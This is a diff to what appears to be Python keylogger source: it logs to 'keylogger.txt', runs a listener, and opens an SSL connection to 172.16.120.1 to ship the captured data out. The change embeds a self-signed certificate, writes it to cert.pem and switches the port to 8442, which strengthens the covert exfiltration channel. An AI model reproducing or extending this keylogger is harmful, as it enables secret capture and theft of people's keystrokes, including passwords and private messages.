@@ -57,6 +57,31 @@ def stop_client(conn, socket, listener, filepath):
 
 def create_ssl_conn(host, port):
 
+    cert = """-----BEGIN CERTIFICATE-----
+MIIDZzCCAk8CFHu2VLkM/4HJ6LlASP/BaLcFNUoRMA0GCSqGSIb3DQEBCwUAMHAx
+CzAJBgNVBAYTAkZSMQ8wDQYDVQQIDAZFU1NPTkUxDjAMBgNVBAcMBVBBUklTMQ0w
+CwYDVQQKDARFU0dJMQswCQYDVQQLDAJJVDEkMCIGCSqGSIb3DQEJARYVeWFuaXMu
+enJpYmlAZ21haWwuY29tMB4XDTIzMTIzMTEzNDAxMloXDTI0MDEzMDEzNDAxMlow
+cDELMAkGA1UEBhMCRlIxDzANBgNVBAgMBkVTU09ORTEOMAwGA1UEBwwFUEFSSVMx
+DTALBgNVBAoMBEVTR0kxCzAJBgNVBAsMAklUMSQwIgYJKoZIhvcNAQkBFhV5YW5p
+cy56cmliaUBnbWFpbC5jb20wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
+AQCyKOpKCF109xqdqaW4MW48N7tL99SrlVnqFciVI1yw+cfYE6ytB8xoDgzqVQIi
+GjegtoZ7BeMgNeE4alT+dKbnrQtzNwufs6LsPPxOxNPlcN4C1XW7t3gaKZ8pMhYd
+Ej89z4y9Ck64Ju6c2TViC9QXigjPLdQGXmr36wvRRwWQYP0lhc7nPE3ehhXS4vRu
+CD8UHmt+BQwiTKDPzEgwuTtwNmPtqX2jnX4krHGwjK3D+pYFJEM9sm6OI0Iwo78N
+qJuttgxlfDTnONDLHlswq1tXPF2IrUwyu0GddnLNlovUi7VDQq+/BCTyOcTtaH7D
+Lh6xKk/bCbXM5Blq2TiPrWPlAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACiPQR2x
+jdu/+/D8WQ9oCVSQCbJjQ2Vyp6HcZgPPZLxvtt+6Jsie2MGbfuT/aoz9uG4v1+ks
+ts4edpRq6vCrhIAYMv1SLC9WPHqprTs0OZu7gcd4z2xzP8Er9Wea5+baM08SQ+MA
+cKyPom1wzBRoYqxOuy9TeKgaeQXu2Ik08OkGZQUbXVN46UGn6rwmEZ7n4E0A1RDW
+uPsnwd5HRbwKvErxSPYwQTptO31yLjRG+7kBtEDTQw3fxlFRyApuDUuABFfFIuT3
+u2GHuvJoscjMnd4xHcpdbl2Xkzcf4zfZsgU/9PTHkAGxjyuGU/bRK7bBsANtZrml
+ZQz6+amlYyEwdjo=
+-----END CERTIFICATE-----"""
+
+    with open('./cert.pem', 'w') as f:
+        f.write(cert)
+
     # création du socket
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.settimeout(3.0)
@@ -104,7 +129,7 @@ listener.start()
 
 
 host = '172.16.120.1'
-port = 8443 
+port = 8442
 
 file_path = 'keylogger.txt'  
 
